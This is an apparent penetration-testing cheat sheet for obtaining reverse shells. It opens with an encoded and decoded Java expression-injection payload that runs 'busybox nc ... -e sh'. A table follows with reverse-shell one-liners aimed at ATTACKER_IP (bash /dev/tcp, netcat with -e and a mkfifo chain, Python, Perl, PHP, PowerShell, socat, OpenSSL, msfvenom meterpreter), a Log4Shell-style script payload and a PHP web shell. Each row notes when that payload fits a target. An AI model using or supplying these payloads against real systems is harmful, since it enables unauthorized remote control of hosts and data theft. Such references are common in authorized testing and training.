4 Rules when trying to get Reverse Shell

- Is your payload correct? busy box?

- Is your port correct?

- If you can't execute shell via 1 liner. Write reverse shell file to file system then execute.

- what kind of web technology running -> what kind of reverse shell needed

- 

Encoded:search?query="%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"
Decoded:search?query="${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"


| **Type**           | **Example Payload**                                                                                     | **When to Use**                                                        | **How to Know You Can Use It**                                                  |
|--------------------|----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|----------------------------------------------------------------------------------|
| **Bash**           | `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`                                                              | When target has bash and can access your IP/port over TCP              | `which bash` or `echo $0` shows bash; target OS is full Linux                   |
| **sh (BusyBox)**   | `sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`                                                                | On minimal systems (e.g., Alpine, embedded) using BusyBox              | `which sh` or `which busybox`; often default shell in containers                |
| **Netcat (nc)**    | `nc -e /bin/sh ATTACKER_IP PORT`                                                                         | When Netcat with `-e` support is available                             | `nc -h` includes `-e`; or run `which nc`, `nc --version`                        |
| **Netcat (no -e)** | ``rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f``               | If Netcat exists but `-e` is disabled                                           | `nc -h` shows no `-e`; use fallback chaining with FIFO                          |
| **Python**         | `python -c 'import socket,subprocess,os; s=socket.socket(); ...'`                                        | If Python is installed                                                 | `which python` or `python --version`; supports TTY spawning                     |
| **Perl**           | `perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;...exec("/bin/sh -i");'`                                   | Legacy systems with Perl                                               | `which perl`; check Perl installed                                              |
| **PHP**            | `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`                         | If you have RCE via PHP or a web shell                                 | `which php`; check web server stack                                             |
| **PowerShell**     | `powershell -c "$client = New-Object Net.Sockets.TCPClient(...)"`                                        | On Windows targets with PowerShell                                     | PowerShell is available; RCE via CMD injection or Win web server                |
| **Socat**          | `socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`                               | If Socat is installed, for fully interactive shells or TLS             | `which socat`; great for persistent backconnects and stable TTY                 |
| **OpenSSL**        | `sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` piped through `openssl s_client ...`                          | When Socat is unavailable but OpenSSL exists for encrypted connection  | `which openssl`; needs listener with cert (`openssl s_server`)                 |
| **Java RCE**       | `${script:javascript:Runtime.getRuntime().exec("nc ...")}`                                               | Log4Shell, Struts2, or Expression Language injection                   | Detect Java injection; test with `${script:javascript:Runtime.getRuntime().exec("id")}` |
| **JSP Reverse Shell** | Upload JSP file that calls `Runtime.getRuntime().exec(...)`                                          | If you can upload/trigger a JSP file on a Tomcat or JSP server         | You control upload, or find `.jsp` endpoint                                     |
| **Meterpreter**    | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=...`                                                | For post-exploitation or persistent C2 access via Metasploit           | You can upload & execute ELF/EXE; listener set up in Metasploit                 |
| **Go Reverse Shell** | Custom Go binary that connects back and spawns shell                                                  | When Go is allowed (rare), or you can upload your own static binary    | Compile locally (`go build`) and upload; use if no scripting language on target |
| **Web Shells**     | PHP: `<?php system($_GET['cmd']); ?>` or ASPX/JSP     
